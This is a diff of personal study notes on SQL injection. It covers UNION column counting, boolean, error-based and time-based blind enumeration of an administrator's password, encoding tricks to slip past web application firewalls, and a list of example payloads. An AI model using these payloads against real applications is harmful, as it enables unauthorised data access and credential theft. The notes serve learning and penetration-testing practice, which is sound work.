@@ -1,4 +1,5 @@
 
+
 ### General Notes
 
 > Unauthorized user take control over SQL statements used by a web application.
@@ -27,35 +28,46 @@
 * POST parameters.  //Use [[Burp Suite]] proxy
 * [[HTTP]] headers.
 
+Different injection characters to try and their [[Web Encoding#URL Encoding / Percent-Encoding]] as well:
+
+|`'`|`%27`|
+|`"`|`%22`|
+|`#`|`%23`|
+|`;`|`%3B`|
+|`)`|`%29`|
+
 > Detecting injection points:
-* Enter the sinqle qoute character and look for weird responses.
+* Enter the sinqle qoute character `'` and look for weird responses.
 * Submit SQL syntax that evaluates that evaluates to true and false to see the difference, such as ` OR 1=1` and ` OR 1=2`.
 * Payloads to trigger time delays.
 * Submit payloads that trigger an out of band network interaction.
 
 ---
 
-#### Union Based Injections
+#### `UNION` Based Injections
 
-> The `UNION` keyword is used to retrieve data from other tables.
-> It appends the results of the additional query to those of the original query.
+The `UNION` keyword is used to retrieve data from other tables. It appends the results of the additional query to those of the original query. It combines the outputs of multiple `SELECT` statements that have the same number of columns.
 
 > The queries must return the same amount of columns as the original one.
 > The queries must return data of the same or allowed data type as the original one.
-> Getting a 200 response code indicates the right number of columns.
+> Getting a 200 [[HTTP#HTTP Response]] code indicates the right number of columns.
+
 
 ##### Number of Columns using Added `NULL,`
->  When the number of nulls matches the number of columns, an additional row of data will be returned in the result set, containing either the word NULL or an empty string.
+
+* Keep adding `NULL` until there is an error. The number of `NULL`s right before the error is the number of columns.
 ```
 ' UNION SELECT NULL--
 ```
-> For oracle, need to add FROM for every SELECT. Use the built in DUAL table.
+>  When the number of nulls matches the number of columns, an additional row of data will be returned in the result set, containing either the word `NULL` or an empty string.
+
+* For oracle, need to add FROM for every SELECT. Use the built in DUAL table.
 ```
 ' UNION SELECT NULL FROM DUAL-- 
 ```
 
 ##### Number of Columns using `ORDER BY`
-> Keep changing the `ORDER BY` index until an error is recieved.
+* Keep changing the `ORDER BY` index until an error is recieved. The number right before the one that produces an error is the number of columns.
 ```
 ' ORDER BY 1--
 ' ORDER BY 2--
@@ -63,9 +75,24 @@
 ```
 
 ##### Checking the Data Type of a column
-> Having known the number of columns, we can replace the `NULL` with a string/number/data-type and check the output.
+
+Having known the number of columns, we can replace the `NULL` with a string/number/data-type and check the output.
+
 > If it succeeds, then we know the data type of that column.
-> We can then get exact data we want if we replace that data in the correct column field. It will be produced in an extra row.
+* We can then get exact data we want if we replace that data in the correct column field
+
+##### Performing Injection
+
+* To do an injection where the two `SELECT` queries output different columns, we simply add to the one with fewer columns more input data until it matches.
+
+```SQL
+SELECT * FROM table_1 UNION SELECT username, password, 1 FROM table_2;
+```
+> table_1 has 3 columns, but table_2 only has 2. So we add another fake column at the end to make it 3 and execute our `UNION` injection.
+
+Sometimes, not all columns are produced as output visible by the user. Therefore, try different values at the different columns to see which ones are visible.
+
+> The data we need is always produced at the end of the output in an extra row.
 
 ---
 
@@ -83,7 +110,7 @@
 > Try injecting a payload and use the `AND` operator with a false statement and a true statement and notice the difference in response.
 > This can be used to enumerate data from tables.
 
-```
+```SQL
 1) x" AND 1=1-- -
 2) x" AND 1=2-- -
 3) x" AND password LIKE 'a%'-- -
@@ -94,7 +121,7 @@
 ##### Tracking [[Cookies]]. 
 > Some applications use tracking cookies to gather data about usage and users.
 > They are processed by a SQL query such as: 
-```
+```SQL
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 ```
 > The behaviour of the website can then be used to determine how the injection is vulnerable.
@@ -108,7 +135,7 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 > Sometimes boolean conditions do not affect the responses.
 > So we can trigger SQL errors conditionally, causing database errors. This might affect the response.
 > Trigger an error when the condition is true, otherwise, don't trigger an error. Check for [[HTTP]] response code 500.
-```
+```SQL
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)='' --
 xyz' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||' --
 ```
@@ -116,38 +143,38 @@ xyz' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||' --
 > Note the single qoute at the end.
 
 > Knowing that the `FROM` part of a query is evaluated first then the `SELECT` part, lets use that to try and find the administrator user. `TO_CHAR` in oracle.
-```
+```SQL
 xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || ' --
 ```
 > If the administrator username exists, then the SELECT query will be evaluated as the FROM part succeeded. The CASE statement is always true, so it will trigger an error. This error can be used in blind injections to alter the response.
 > If the FROM part fails, then the SELECT CASE part won't even run. The page will return normally.
 
 >To add any more conditions, add `AND` in the FROM clause.
-```
+```SQL
 xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND length(password)>5) || ' --
 ```
 
 ##### Blind Enumeration 
 
 * Check for the presence of a table:
-```
+```SQL
 HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --'
 HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users WHERE ROWNUM=1)='x' --'   //oracle
 ```
 > This returns an 'x' for every row in the table. we limit to 1 to check for only 1 x returned. If there is no x returned, then there is no table, or there are no rows in that table.
 
 * Check for the presence of an entry:
-```
+```SQL
 HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator')='administrator' --'
 ```
 
 * Check for the length of a row entry:
-```
+```SQL
 HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > 1 )='administrator' --'
 ```
 
 * Check for the characters of a row entry: (`substr` for oracle)
-```
+```SQL
 HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a' --'
 ```
 > First 1 is the index, the second 1 is the length of the substring.
@@ -158,7 +185,7 @@ HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE usernam
 > We can make the error message include the sensitive data we need.
 
 > Done using the `CAST()` function, which converts data into different data types.
-```
+```SQL
 CAST((SELECT x FROM y) AS int)
 ```
 > We usually want string type data. This will return an error message saying invalid data type with the requested data x from table y.
@@ -168,7 +195,7 @@ CAST((SELECT x FROM y) AS int)
 > Delaying the SQL queries causes a delay in the [[HTTP]] response.
 > Use this delayed time to infer the truth of our query.
 
-```
+```SQL
 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 ```
 > If the condition is true, that is the first letter of the admin password is larger than m, then the response will come after a given delay.
@@ -187,8 +214,18 @@ CAST((SELECT x FROM y) AS int)
 
 > The payloads for OAST for the different databases are in the [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 > To add them, use this `' || <payload> -- ` or `' UNION <payload> --`.
----
 
+---
+### Reading Files
+
+
+
+---
+### Writing Files
+
+
+
+---
 ### Different Inputs and Obfuscating Attacks
 
 > Obfuscating is using [[Web Encoding]] to perform attacks that could be blocked using web application [[Firewall]]s.
@@ -197,7 +234,7 @@ CAST((SELECT x FROM y) AS int)
 > For XML use `hex-entities` encoding in [[Burp Suite]]'s hackvertor extension to bypass.
 
 > Can encode some letters of the query to bypass these defense mechanisms.
-```
+```SQL
 SELECT * FROM information_schema.tables
 &#x53;ELECT * FROM information_schema.tables
 ```
@@ -205,21 +242,31 @@ SELECT * FROM information_schema.tables
 > This will be decoded first server side, and then passed to the SQL interpreter that communicates with the database.
 
 ---
-
 ### Enumerating Database
 
 > Get the database information and version.
-```
+```SQL
 SELECT BANNER FROM v$version;    //oracle
 SELECT version FROM v$instance   //oracle
 SELECT @@version  //microsoft and MySQL
 SELECT version() // PostgreSQL
 ```
 
-##### Using Information_schema
+##### Using `INFORMATION_SCHEMA` Database
 
-> Can use the `information_schema` database present in most systems (NOT IN ORACLE) to list the tables
+This database has metadata information about the tables and databases present on the system. Can be used to get information about the system before attacking. 
+
+> This doesn't work on Oracle systems. There is an equivalent below.
+
+* To list the databases on the system.
+```SQL
+SELECT * from information_schema.schemata
 ```
+> The elements in this table include:
+* SCHEMA_NAME.
+
+* To list all tables on the system.
+```SQL
 SELECT * FROM information_schema.tables 
 ```
 > The elements in this database are: (instead of * you can use any of these)
@@ -228,7 +275,7 @@ SELECT * FROM information_schema.tables
 * TABLE_SCHEMA
 * TABLE_TYPE
 
-> Can use one of the tables output in the previous command to display the columns and data types of that table
+* To get the information of a table.
 ```
 SELECT * FROM information_schema.columns WHERE table_name= ''
 ```
@@ -259,10 +306,15 @@ SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 * SQL comments: `--` or `#`. For MySQL and Microsoft, add a space then `-` .
 
 ##### Example Payloads
-> `' OR 'a'='a ` .
-> `' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a `.
-> `' UNION SELECT user(); -- - `. // comment then space then `-` to remove remainder of the query.
-> `2' AND 1=1; -- - `.
+
+```SQL
+' OR 'a'='a
+' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a
+' UNION SELECT user(); -- -
+2' AND 1=1; -- -
+```
+> Comments can either be `--` or `-- -`.
+> Try the second one if the first doesn't work.
 
 ---
 ### Extra Info
